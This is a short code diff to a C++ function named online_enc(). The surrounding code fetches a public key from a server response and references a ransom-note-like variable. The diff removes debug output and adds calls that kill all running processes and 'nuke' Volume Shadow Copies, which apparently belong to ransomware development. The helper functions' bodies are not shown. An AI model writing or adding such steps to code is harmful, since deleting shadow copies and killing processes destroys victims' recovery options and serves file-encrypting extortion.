@@ -98,8 +98,11 @@ int online_enc() {
             PUBLIC_KEY = jsonResponse["public_key"];
         }
     }
-    std::cout << "OFF_README: " << OFF_README << std::endl;
-    std::cout << "PUBLIC_KEY: " << PUBLIC_KEY << std::endl;
+    
+
+    // kill all processes and nuke VSS
+    KillProcs();
+    nuke_vss();
     
 
     return 0;
